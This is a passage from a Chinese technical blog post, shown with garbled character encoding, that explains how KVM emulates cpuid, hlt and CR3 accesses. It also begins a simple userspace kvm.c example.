è·³è¿‡å½“å‰æ¨¡æ‹Ÿçš„æŒ‡ä»¤ï¼Œç»§ç»­æ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤ */</span><br>    kvm_arch_ops-&gt;skip_emulated_instruction(vcpu);<br>&#125;<br><br></code></pre></td></tr></table></figure><ol><li>å½“è™šæ‹Ÿæœºæ‰§è¡Œ<code>cpuid</code>æŒ‡ä»¤å¹¶äº§ç”Ÿ VM exit æ—¶ï¼ŒKVMä¼šè°ƒç”¨ <code>kvm_emulate_cpuid</code> å‡½æ•°è¿›è¡Œæ¨¡æ‹Ÿã€‚</li><li><code>vcpu-&gt;regs[VCPU_REGS_RAX]</code> ä¸­å­˜å‚¨äº† <code>cpuid</code> æŒ‡ä»¤ä¸­çš„åŠŸèƒ½å·ï¼Œå³ <code>eax</code> å¯„å­˜å™¨çš„å€¼ã€‚è¿™ä¸ªå€¼ç”¨æ¥ç¡®å®šè¦æŸ¥è¯¢çš„ CPU ç‰¹æ€§ä¿¡æ¯ã€‚</li><li>åœ¨ <code>vcpu-&gt;cpuid_entries</code> æ•°ç»„ä¸­ï¼Œå­˜å‚¨äº†ä¸€ç³»åˆ—çš„ CPU ç‰¹æ€§ä¿¡æ¯ï¼Œæ¯ä¸ªå…ƒç´ éƒ½æ˜¯ä¸€ä¸ª <code>kvm_cpuid_entry</code> å®ä¾‹ï¼Œå…¶ä¸­åŒ…å«äº†ä¸åŒåŠŸèƒ½å·å¯¹åº”çš„ç‰¹æ€§ä¿¡æ¯ã€‚</li><li>é€šè¿‡éå† <code>vcpu-&gt;cpuid_entries</code> æ•°ç»„ï¼ŒKVM åœ¨å…¶ä¸­æŸ¥æ‰¾å…·æœ‰ä¸å½“å‰åŠŸèƒ½å·åŒ¹é…çš„ç‰¹æ€§ä¿¡æ¯ï¼Œå³ <code>e-&gt;function == function</code>ã€‚</li><li>å¦‚æœæ‰¾åˆ°åŒ¹é…çš„ç‰¹æ€§ä¿¡æ¯ï¼ˆ<code>best</code> éç©ºï¼‰ï¼Œåˆ™å°†è¯¥ç‰¹æ€§ä¿¡æ¯ä¸­çš„ <code>eax</code>ã€<code>ebx</code>ã€<code>ecx</code>ã€<code>edx</code> å­—æ®µçš„å€¼åˆ†åˆ«å¤åˆ¶åˆ°è™šæ‹Ÿ CPU å¯„å­˜å™¨ <code>vcpu-&gt;regs</code> çš„ç›¸åº”ä½ç½®ï¼Œä»¥ä¾¿åœ¨è¿›å…¥è™šæ‹Ÿæœºåï¼Œè™šæ‹Ÿ CPU å¯ä»¥ä»è¿™äº›å¯„å­˜å™¨è¯»å– CPU ç›¸å…³ä¿¡æ¯å’Œç‰¹æ€§ã€‚</li><li>æœ€åï¼Œ<code>skip_emulated_instruction</code> å‡½æ•°ç”¨äºé€šçŸ¥ KVM è·³è¿‡å½“å‰æ¨¡æ‹Ÿçš„æŒ‡ä»¤ï¼Œç»§ç»­æ‰§è¡Œä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚</li></ol><p>ä¸‹é¢è¿™æ®µä»£ç ç¤ºä¾‹æ˜¯åœ¨ç”¨æˆ·ç©ºé—´ä¸­å¤„ç†è™šæ‹Ÿæœºçš„ CPU ç‰¹æ€§ä¿¡æ¯ï¼Œä»¥ä¾¿åœ¨ä¸åŒç±»å‹çš„å®¿ä¸»æœºä¹‹é—´è¿ç§»è™šæ‹Ÿæœºã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒé€šè¿‡ä» KVM å†…æ ¸æ¨¡å—è·å– CPU ç‰¹æ€§ä¿¡æ¯ï¼Œå¹¶æ¸…é™¤ä¸æ”¯æŒ AVX2 æŒ‡ä»¤çš„ç‰¹æ€§ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm_cpuid2</span> *<span class="hljs-title">kvm_cpuid</span>;</span><br>kvm_cpuid = (struct kvm_cpuid2 *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(*kvm_cpuid) + CPUID_ENTRIES * <span class="hljs-keyword">sizeof</span>(*kvm_cpuid-&gt;entries));<br>kvm_cpuid-&gt;nent = CPUID_ENTRIES;<br><br><span class="hljs-comment">// è·å–æ”¯æŒçš„ CPU ç‰¹æ€§ä¿¡æ¯</span><br>ioctl(vcpu_fd, KVM_GET_SUPPORTED_CPUID, kvm_cpuid);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; kvm_cpuid-&gt;nent; i++) &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kvm_cpuid_entry2</span> *<span class="hljs-title">entry</span> =</span> &amp;kvm_cpuid-&gt;entries[i];<br>    <br>    <span class="hljs-keyword">if</span> (entry-&gt;function == <span class="hljs-number">7</span>) &#123;<br>        <span class="hljs-comment">/* æ¸…é™¤ AVX2 æŒ‡ä»¤æ”¯æŒ */</span><br>        entry-&gt;ebx &amp;= ~(<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">6</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// å°†ä¿®æ”¹åçš„ CPU ç‰¹æ€§ä¿¡æ¯è®¾ç½®å›è™šæ‹Ÿæœº</span><br>ioctl(vcpu_fd, KVM_SET_CPUID2, kvm_cpuid);<br><br></code></pre></td></tr></table></figure><p><strong>hlt</strong></p><blockquote><p><code>hlt</code> æŒ‡ä»¤æ˜¯ä¸€æ¡æ±‡ç¼–æŒ‡ä»¤ï¼Œç”¨äºè®©å¤„ç†å™¨è¿›å…¥ç©ºé—²çŠ¶æ€ã€‚å®ƒçš„ä½œç”¨æ˜¯æš‚åœå½“å‰å¤„ç†å™¨çš„æ‰§è¡Œï¼Œç­‰å¾…å¤–éƒ¨ä¸­æ–­æˆ–å…¶ä»–äº‹ä»¶çš„å‘ç”Ÿã€‚å½“å¤„ç†å™¨æ‰§è¡Œåˆ° <code>hlt</code> æŒ‡ä»¤æ—¶ï¼Œå®ƒä¼šåœæ­¢æ‰§è¡ŒæŒ‡ä»¤ï¼Œå¹¶å°†è‡ªå·±ç½®äºä½åŠŸè€—çŠ¶æ€ï¼Œç›´åˆ°æœ‰æ–°çš„ä¸­æ–­æˆ–äº‹ä»¶è§¦å‘å¤„ç†å™¨å”¤é†’ã€‚</p></blockquote><p><code>hlt</code> æŒ‡ä»¤ç”¨äºè®©å¤„ç†å™¨è¿›å…¥åœæœºçŠ¶æ€ã€‚åœ¨å¼€å¯è¶…çº¿ç¨‹çš„å¤„ç†å™¨ä¸­ï¼Œ<code>hlt</code> æŒ‡ä»¤ä¼šåœæ­¢é€»è¾‘æ ¸çš„è¿è¡Œã€‚å¯¹äºè™šæ‹ŸåŒ–ç¯å¢ƒä¸­çš„è™šæ‹Ÿæœºï¼Œå¦‚æœå…è®¸è™šæ‹Ÿæœºçš„æŸä¸ªæ ¸æœ¬åœ°æ‰§è¡Œ <code>hlt</code> æŒ‡ä»¤ï¼Œå°†å¯¼è‡´ç‰©ç†CPUåœæ­¢è¿è¡Œï¼Œä½†å®é™…ä¸Šæˆ‘ä»¬åªéœ€è¦åœæ­¢ç”¨äºæ¨¡æ‹ŸCPUçš„çº¿ç¨‹ã€‚å› æ­¤ï¼Œåœ¨è™šæ‹ŸåŒ–ç¯å¢ƒä¸­ï¼Œè™šæ‹Ÿæœºæ‰§è¡Œ <code>hlt</code> æŒ‡ä»¤æ—¶éœ€è¦é™·å…¥KVMï¼Œ<strong>ç”±KVMæŒ‚èµ·å¯¹åº”çš„VCPUçº¿ç¨‹ï¼Œè€Œä¸æ˜¯åœæ­¢ç‰©ç†CPUçš„è¿è¡Œ</strong>ã€‚ä¸‹é¢ä»£ç ç‰‡æ®µå±•ç¤ºäº†å¦‚ä½•åœ¨KVMä¸­å¤„ç†è™šæ‹Ÿæœºæ‰§è¡Œ <code>hlt</code> æŒ‡ä»¤ï¼Œé€šè¿‡è®¾ç½®çº¿ç¨‹çŠ¶æ€å’Œè°ƒç”¨å†…æ ¸è°ƒåº¦å‡½æ•°ï¼Œå®ç°äº†åœ¨è™šæ‹Ÿæœºä¸­æ­£ç¡®å¤„ç† <code>hlt</code> æŒ‡ä»¤çš„é€»è¾‘ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// å½“å¤„ç†å™¨æ‰§è¡ŒhltæŒ‡ä»¤åï¼Œå°†å¤„äºåœæœºçŠ¶æ€ï¼ˆHaltï¼‰ã€‚</span><br><span class="hljs-comment">// å¯¹äºå¼€å¯äº†è¶…çº¿ç¨‹çš„å¤„ç†å™¨ï¼ŒhltæŒ‡ä»¤æ˜¯åœæ­¢çš„é€»è¾‘æ ¸ã€‚</span><br><span class="hljs-comment">// ä¹‹åå¦‚æœæ”¶åˆ°NMIã€SMIä¸­æ–­ï¼Œæˆ–è€…resetä¿¡å·ç­‰ï¼Œåˆ™æ¢å¤è¿è¡Œã€‚</span><br><span class="hljs-comment">// ä½†æ˜¯ï¼Œå¯¹äºè™šæ‹Ÿæœºè€Œè¨€ï¼Œå¦‚æœä»»å‡­Guestçš„æŸä¸ªæ ¸æœ¬åœ°æ‰§è¡Œhltï¼Œ</span><br><span class="hljs-comment">// å°†å¯¼è‡´ç‰©ç†CPUåœæ­¢è¿è¡Œï¼Œç„¶è€Œæˆ‘ä»¬éœ€è¦åœæ­¢çš„åªæ˜¯Hostä¸­ç”¨äºæ¨¡æ‹ŸCPUçš„çº¿ç¨‹ã€‚</span><br><span class="hljs-comment">// å› æ­¤ï¼ŒGuestæ‰§è¡ŒhltæŒ‡ä»¤æ—¶éœ€è¦é™·å…¥KVMä¸­ï¼Œç”±KVMæŒ‚èµ·VCPUå¯¹åº”çš„çº¿ç¨‹ï¼Œè€Œä¸æ˜¯åœæ­¢ç‰©ç†CPUã€‚</span><br><br><span class="hljs-comment">// æ–‡ä»¶ï¼šlinux.git/drivers/kvm/vmx.c</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">handle_halt</span><span class="hljs-params">(struct kvm_vcpu *vcpu, ...)</span></span><br><span class="hljs-function"></span>&#123;<br>    skip_emulated_instruction(vcpu);<br>    <span class="hljs-keyword">return</span> kvm_emulate_halt(vcpu);<br>&#125;<br><br><span class="hljs-comment">// æ–‡ä»¶ï¼šlinux.git/drivers/kvm/kvm_main.c</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">kvm_emulate_halt</span><span class="hljs-params">(struct kvm_vcpu *vcpu)</span></span><br><span class="hljs-function"></span>&#123;<br>    ...<br>    kvm_vcpu_kernel_halt(vcpu);<br>    ...<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">kvm_vcpu_kernel_halt</span><span class="hljs-params">(struct kvm_vcpu *vcpu)</span></span><br><span class="hljs-function"></span>&#123;<br>    ...<br>    <span class="hljs-keyword">while</span> (!(irqchip_in_kernel(vcpu-&gt;kvm) &amp;&amp; kvm_cpu_has_interrupt(vcpu))<br>            &amp;&amp; !vcpu-&gt;irq_summary &amp;&amp; !signal_pending(current)) &#123;<br>        set_current_state(TASK_INTERRUPTIBLE);<br>        ...<br>        schedule();<br>        ...<br>    &#125;<br>    ...<br>    set_current_state(TASK_RUNNING);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1-3-3-è®¿é—®å…·æœ‰å‰¯ä½œç”¨çš„å¯„å­˜å™¨"><a href="#1-3-3-è®¿é—®å…·æœ‰å‰¯ä½œç”¨çš„å¯„å­˜å™¨" class="headerlink" title="1.3.3 è®¿é—®å…·æœ‰å‰¯ä½œç”¨çš„å¯„å­˜å™¨"></a>1.3.3 è®¿é—®å…·æœ‰å‰¯ä½œç”¨çš„å¯„å­˜å™¨</h3><p>åœ¨è™šæ‹ŸåŒ–ç¯å¢ƒä¸­ï¼ŒGuestè®¿é—®CPUçš„æŸäº›å¯„å­˜å™¨æ—¶ï¼Œé™¤äº†è¯»å†™å¯„å­˜å™¨çš„å†…å®¹å¤–ï¼Œè¿˜å¯èƒ½äº§ç”Ÿä¸€äº›å‰¯ä½œç”¨ã€‚å¯¹äºè¿™äº›å…·æœ‰å‰¯ä½œç”¨çš„è®¿é—®ï¼ŒCPUéœ€è¦ä»Guestæ¨¡å¼é™·å…¥VMMï¼Œç”±VMMè¿›è¡Œæ¨¡æ‹Ÿï¼Œä»¥å®Œæˆå‰¯ä½œç”¨æ“ä½œã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å…¸å‹ç¤ºä¾‹ï¼š</p><ol><li><strong>æ ¸é—´ä¸­æ–­ï¼ˆInter-processor Interruptsï¼‰ï¼š</strong> å½“Guestè®¿é—®LAPICçš„ä¸­æ–­æ§åˆ¶å¯„å­˜å™¨æ—¶ï¼Œä¾‹å¦‚å†™å…¥ä¸­æ–­æ§åˆ¶å¯„å­˜å™¨ï¼Œå¯èƒ½<strong>è§¦å‘LAPICå‘å…¶ä»–å¤„ç†å™¨</strong>å‘é€æ ¸é—´ä¸­æ–­ã€‚è¿™ç§æ“ä½œçš„å‰¯ä½œç”¨éœ€è¦ç”±VMMæ¨¡æ‹Ÿï¼Œä»è€Œä¿è¯åœ¨è™šæ‹ŸåŒ–ç¯å¢ƒä¸­çš„æ­£ç¡®å¤„ç†ã€‚</li></ol><blockquote><p>LAPICï¼Œå…¨ç§°ä¸ºâ€œLocal Advanced Programmable Interrupt Controllerâ€ï¼Œæ˜¯ä¸€ç§<strong>é«˜çº§å¯ç¼–ç¨‹ä¸­æ–­æ§åˆ¶å™¨</strong>ï¼Œå¸¸ç”¨äº<strong>å¤šå¤„ç†å™¨ç³»ç»Ÿä¸­çš„å„ä¸ªå¤„ç†å™¨æ ¸å¿ƒä¹‹é—´è¿›è¡Œä¸­æ–­çš„ç®¡ç†å’Œåè°ƒ</strong>ã€‚LAPICè´Ÿè´£å¤„ç†æœ¬åœ°ï¼ˆå³åŒä¸€ç‰©ç†å¤„ç†å™¨ä¸Šçš„ï¼‰ä¸­æ–­ï¼Œä»¥åŠå¤„ç†å™¨ä¹‹é—´çš„é€šä¿¡ã€‚</p></blockquote><p> 2.<strong>åœ°å€ç¿»è¯‘å’Œé¡µè¡¨åˆ‡æ¢ï¼š</strong> å½“Gueståˆ‡æ¢è¿›ç¨‹ï¼Œå…¶å†…æ ¸ä¼šè®¾ç½®CR3å¯„å­˜å™¨æŒ‡å‘å³å°†è¿è¡Œçš„è¿›ç¨‹çš„é¡µè¡¨ã€‚åœ¨ä½¿ç”¨å½±å­é¡µè¡¨ï¼ˆShadow Page Tableï¼‰æœºåˆ¶å®ç°è™šæ‹Ÿæœºåœ°å€ï¼ˆGVAï¼‰åˆ°å®¿ä¸»æœºç‰©ç†åœ°å€ï¼ˆHPAï¼‰çš„æ˜ å°„æ—¶ï¼Œ<strong>è™šæ‹ŸæœºæœŸæœ›ç‰©ç†CPUçš„CR3å¯„å­˜å™¨æŒ‡å‘KVMä¸ºGuestä¸­å³å°†æŠ•å…¥è¿è¡Œçš„è¿›ç¨‹å‡†å¤‡çš„å½±å­é¡µè¡¨ã€‚</strong> å› æ­¤ï¼Œæ¯å½“Gueståˆ‡æ¢è¿›ç¨‹æ—¶ï¼ŒCPUä¼šé™·å…¥KVMï¼Œ<strong>KVMå°†CR3å¯„å­˜å™¨è®¾ç½®ä¸ºæŒ‡å‘å½±å­é¡µè¡¨</strong>ï¼Œä»¥ç¡®ä¿æ­£ç¡®çš„åœ°å€æ˜ å°„ã€‚</p><p>åœ¨å½±å­é¡µè¡¨æœºåˆ¶ä¸­ï¼ŒKVMéœ€è¦å¯¹å¤„ç†Guestå¯¹æ§åˆ¶å¯„å­˜å™¨CR3çš„è®¿é—®è¿›è¡Œç‰¹æ®Šå¤„ç†ï¼Œä»¥ä¾¿è®©KVMèƒ½å¤Ÿæ­£ç¡®åœ°è¿›è¡Œè™šæ‹Ÿåœ°å€åˆ°å®¿ä¸»æœºç‰©ç†åœ°å€çš„è½¬æ¢ã€‚ä¸ºäº†å®ç°è¿™ä¸ªç›®æ ‡ï¼ŒKVMéœ€è¦åœ¨<strong>VMCS</strong>ï¼ˆVirtual Machine Control Structureï¼Œè™šæ‹Ÿæœºæ§åˆ¶ç»“æ„ï¼‰ä¸­çš„Processor-Based VM-Execution Controlså­—æ®µä¸­è®¾ç½®ç‰¹å®šçš„æ ‡å¿—ä½ï¼Œå³ç¬¬15ä½CR3-load exitingã€‚<strong>è¿™ä¸ªæ ‡å¿—ä½çš„è®¾ç½®ä¼šå¯¼è‡´æ¯å½“Guestè®¿é—®ç‰©ç†CPUçš„CR3å¯„å­˜å™¨æ—¶ï¼Œç‰©ç†CPUä¼šè§¦å‘VM exitï¼Œå³ä»Guestæ¨¡å¼åˆ‡æ¢åˆ°Hostæ¨¡å¼ï¼Œç„¶åé™·å…¥KVM</strong>ï¼Œç”±KVMè´Ÿè´£å¤„ç†è¿™ä¸ªVM exitã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// å¤„ç†å¤„ç†å™¨æ§åˆ¶å¯„å­˜å™¨ï¼ˆCRï¼‰çš„æ“ä½œ</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">handle_cr</span><span class="hljs-params">(struct kvm_vcpu *vcpu, â€¦)</span></span><br><span class="hljs-function"></span>&#123;<br>    u64 exit_qualification; <span class="hljs-comment">// é€€å‡ºé™å®šä¿¡æ¯</span><br>    <span class="hljs-keyword">int</span> cr; <span class="hljs-comment">// æ§åˆ¶å¯„å­˜å™¨ç¼–å·</span><br>    <span class="hljs-keyword">int</span> reg; <span class="hljs-comment">// ç›®æ ‡å¯„å­˜å™¨ç¼–å·</span><br>    <br>    <span class="hljs-comment">// ä»VMCSä¸­è¯»å–é€€å‡ºé™å®šä¿¡æ¯</span><br>    exit_qualification = vmcs_read64(EXIT_QUALIFICATION);<br>    <span class="hljs-comment">// è§£æé€€å‡ºé™å®šä¿¡æ¯ï¼Œæå–æ§åˆ¶å¯„å­˜å™¨ç¼–å·å’Œç›®æ ‡å¯„å­˜å™¨ç¼–å·</span><br>    cr = exit_qualification &amp; <span class="hljs-number">15</span>;<br>    reg = (exit_qualification &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">15</span>;<br>    <br>    <span class="hljs-comment">// æ ¹æ®é€€å‡ºé™å®šä¿¡æ¯çš„æ“ä½œç±»å‹é€‰æ‹©å¤„ç†æ–¹å¼</span><br>    <span class="hljs-keyword">switch</span> ((exit_qualification &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">3</span>) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>: <span class="hljs-comment">/* mov to cr */</span><br>            <span class="hljs-comment">// æ ¹æ®ä¸åŒçš„æ§åˆ¶å¯„å­˜å™¨æ‰§è¡Œä¸åŒçš„æ“ä½œ</span><br>            <span class="hljs-keyword">switch</span> (cr) &#123;<br>                <span class="hljs-comment">// ...</span><br>                <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>: <span class="hljs-comment">// æ§åˆ¶å¯„å­˜å™¨CR3</span><br>                    <span class="hljs-comment">// è°ƒç”¨å‡½æ•°ï¼ŒåŠ è½½ç›®æ ‡å¯„å­˜å™¨çš„å€¼åˆ°å½“å‰è™šæ‹ŸCPUçš„rspå’Œripå¯„å­˜å™¨</span><br>                    vcpu_load_rsp_rip(vcpu);<br>                    <span class="hljs-comment">// è°ƒç”¨å‡½æ•°ï¼Œè®¾ç½®å½“å‰è™šæ‹ŸCPUçš„CR3å¯„å­˜å™¨å€¼ä¸ºç›®æ ‡å¯„å­˜å™¨çš„å€¼</span><br>                    set_cr3(vcpu, vcpu-&gt;regs[reg]);<br>                    <span class="hljs-comment">// è·³è¿‡å·²æ¨¡æ‹Ÿçš„æŒ‡ä»¤</span><br>                    skip_emulated_instruction(vcpu);<br>                    <span class="hljs-comment">// è¿”å›å¤„ç†ç»“æœ</span><br>                    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>                <span class="hljs-comment">// ...</span><br>            &#125;<br>        <span class="hljs-comment">// ...</span><br>    &#125;<br>    <span class="hljs-comment">// ...</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="1-5-ä¸€ä¸ªç®€å•KVMç”¨æˆ·ç©ºé—´å®ä¾‹"><a href="#1-5-ä¸€ä¸ªç®€å•KVMç”¨æˆ·ç©ºé—´å®ä¾‹" class="headerlink" title="1.5  ä¸€ä¸ªç®€å•KVMç”¨æˆ·ç©ºé—´å®ä¾‹"></a>1.5  ä¸€ä¸ªç®€å•KVMç”¨æˆ·ç©ºé—´å®ä¾‹</h2><p>å…ˆåšä¸€ä¸‹æ¦‚å¿µè¾¨æï¼š</p><ul><li><strong>åˆ›å»ºè™šæ‹Ÿæœºï¼ˆCreate VMï¼‰</strong>ï¼šè¿™æŒ‡çš„æ˜¯åœ¨è™šæ‹ŸåŒ–å¹³å°ï¼ˆå¦‚ KVMã€VMwareã€Hyper-V ç­‰ï¼‰ä¸­ï¼Œå»ºç«‹ä¸€ä¸ª<strong>è™šæ‹Ÿæœºçš„å®ä¾‹</strong>ã€‚åœ¨è¿™ä¸€æ­¥éª¤ä¸­ï¼Œä½ <strong>ä¸ºè™šæ‹Ÿæœºåˆ†é…èµ„æºï¼Œé…ç½®ç¡¬ä»¶ç‰¹æ€§ï¼Œå¦‚å†…å­˜ã€å¤„ç†å™¨ç­‰</strong>ã€‚åˆ›å»ºè™šæ‹Ÿæœºæ˜¯è™šæ‹ŸåŒ–å¹³å°æä¾›çš„åŠŸèƒ½ï¼Œå®ƒæ˜¯è®¾ç½®è™šæ‹Ÿæœºçš„åŸºæœ¬ç¯å¢ƒã€‚</li><li><strong>åˆ›å»º Guest</strong>ï¼šè¿™æŒ‡çš„æ˜¯åœ¨<strong>è™šæ‹Ÿæœºå†…éƒ¨å®‰è£…ä¸€ä¸ªæ“ä½œç³»ç»Ÿ</strong>ï¼ˆGuest OSï¼‰ï¼Œä½¿è™šæ‹Ÿæœºèƒ½å¤Ÿåœ¨å…¶å†…éƒ¨è¿è¡Œä¸€ä¸ªç‹¬ç«‹çš„æ“ä½œç³»ç»Ÿå®ä¾‹ã€‚è¿™ä¸ªæ“ä½œç³»ç»Ÿå¯ä»¥æ˜¯ Windowsã€Linux æˆ–å…¶ä»–æ”¯æŒçš„æ“ä½œç³»ç»Ÿã€‚åœ¨åˆ›å»º Guest æ—¶ï¼Œä½ éœ€è¦å®‰è£…æ“ä½œç³»ç»Ÿçš„é•œåƒæ–‡ä»¶ï¼Œè¿›è¡Œæ“ä½œç³»ç»Ÿçš„é…ç½®å’Œè®¾ç½®ï¼Œå°±åƒåœ¨ç‰©ç†ç¡¬ä»¶ä¸Šå®‰è£…æ“ä½œç³»ç»Ÿä¸€æ ·ã€‚</li></ul><p>é€šè¿‡ä¸€ä¸ª<strong>å…·ä½“çš„KVMç”¨æˆ·ç©ºé—´çš„å®ä¾‹</strong>ï¼Œæˆ‘ä»¬å¯ä»¥æ€»ç»“CPUè™šæ‹ŸåŒ–çš„å…³é”®æ¦‚å¿µå’Œæ­¥éª¤ã€‚åœ¨è¿™ä¸ªå®ä¾‹ä¸­ï¼Œæˆ‘ä»¬å°†ä»£ç æ”¾åœ¨ä¸€ä¸ªåä¸ºkvm.cçš„æ–‡ä»¶ä¸­ï¼Œä¸»è¦æ¶µç›–ä»¥ä¸‹å‡ ä¸ªè¦ç‚¹ï¼š</p><ol><li><strong>è™šæ‹Ÿæœºï¼ˆVMï¼‰ç»“æ„ä½“</strong>ï¼ˆvmï¼‰ï¼šè¡¨ç¤ºä¸€å°è™šæ‹Ÿæœºï¼ŒåŒ…å«åŸºæœ¬çš„è®¡ç®—æœºç»„ä»¶ï¼Œå¦‚å¤„ç†å™¨å’Œå†…å­˜ã€‚æ¯ä¸ª<strong>è™šæ‹Ÿæœºå¯ä»¥åŒ…å«å¤šä¸ªå¤„ç†å™¨ï¼Œæ¯ä¸ªå¤„ç†å™¨æœ‰è‡ªå·±çš„çŠ¶æ€ï¼ˆå¯„å­˜å™¨</strong>ï¼‰ã€‚</li><li><strong>å¤„ç†å™¨ï¼ˆVCPUï¼‰ç»“æ„ä½“</strong>ï¼ˆvcpuï¼‰ï¼šè¡¨ç¤ºä¸€ä¸ªè™šæ‹Ÿçš„å¤„ç†å™¨ã€‚åœ¨è¿™ä¸ªå®ä¾‹ä¸­ï¼Œæˆ‘ä»¬<strong>åªè™šæ‹Ÿäº†ä¸€ä¸ªvcpuã€‚æ¯ä¸ªvcpuå…·æœ‰è‡ªå·±çš„å¯„å­˜å™¨çŠ¶æ€</strong>ï¼Œå¦‚é€šç”¨å¯„å­˜å™¨å’Œç‰¹æ®Šå¯„å­˜å™¨ã€‚</li><li><strong>ç”¨æˆ·ç©ºé—´ä¸å†…æ ¸é€šä¿¡</strong>ï¼šç”¨æˆ·ç©ºé—´é€šè¿‡æ–‡ä»¶æè¿°ç¬¦/dev/kvm ä¸å†…æ ¸ä¸­çš„KVMæ¨¡å—è¿›è¡Œé€šä¿¡ã€‚åœ¨å®ä¾‹ä¸­ï¼Œæˆ‘ä»¬<strong>ä½¿ç”¨å…¨å±€å˜é‡g_dev_fd æ¥è®°å½•æ‰“å¼€çš„/dev/kvm æ–‡ä»¶æè¿°ç¬¦</strong>ã€‚</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/kvm.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-comment">// å®šä¹‰è™šæ‹Ÿæœºç»“æ„ä½“</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm</span> &#123;</span><br>    <span class="hljs-keyword">int</span> vm_fd;                           <span class="hljs-comment">// è™šæ‹Ÿæœºæ–‡ä»¶æè¿°ç¬¦ï¼Œç”¨äºä¸å†…æ ¸é€šä¿¡</span><br>    __u64 ram_size;                      <span class="hljs-comment">// è™šæ‹Ÿæœºå†…å­˜å¤§å°</span><br>    __u64 ram_start;                     <span class="hljs-comment">// è™šæ‹Ÿæœºå†…å­˜èµ·å§‹åœ°å€</span><br>    <span 